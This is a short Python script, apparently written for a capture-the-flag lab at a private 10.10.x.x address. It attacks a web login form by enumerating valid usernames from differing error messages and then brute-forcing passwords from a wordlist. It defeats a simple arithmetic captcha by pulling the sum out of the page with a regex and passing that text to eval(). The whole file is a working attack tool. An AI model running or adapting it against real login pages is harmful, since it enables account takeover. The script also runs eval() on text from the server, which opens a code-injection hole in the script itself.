#!/usr/bin/python3
import requests
import re


def find_username(url):
    users_file = open('usernames', 'r')

    users_list = []

    for user in users_file.readlines():
        users_list.append(user.strip())

    post = {
        'username': 'user',
        'password': '1234',
        'captcha': '1234'
    }

    response_request = requests.post(url, post)

    for user in users_list:
        pattern = "([0-9]+\s(\+|\-|\*){1}\s[0-9]+\s=\s\?)"

        captcha_filter = re.search(pattern, str(response_request.content))

        captcha_result = eval(captcha_filter.group(0).split('=')[0].strip())

        new_post_data = {
            'username': user,
            'password': '1234',
            'captcha': str(captcha_result)
        }

        response_request = requests.post(url, new_post_data)

        text_failed = 'does not exist'

        if text_failed not in str(response_request.content):
            print(f"User Located: {user}")
            return user


def find_password(url, user):
    password_file = open('passwords', 'r')

    password_list = []

    for password in password_file.readlines():
        password_list.append(password.strip())

    post = {
        'username': 'user',
        'password': '1234',
        'captcha': '1234'
    }
    response_request = requests.post(url, post)

    for password in password_list:
        pattern = "([0-9]+\s(\+|\-|\*){1}\s[0-9]+\s=\s\?)"

        captcha_filter = re.search(pattern, str(response_request.content))

        captcha_result = eval(captcha_filter.group(0).split('=')[0].strip())

        new_post_data = {
            'username': user,
            'password': password,
            'captcha': str(captcha_result)
        }

        response_request = requests.post(url, new_post_data)

        text_failed = 'Invalid password for'

        if text_failed not in str(response_request.content):
            print(f"Password Located: {password}")
            return password


url = 'http://10.10.33.24/login'

user = find_username(url)
password = find_password(url, user)

print(f"User: {user} - Password: {password}")
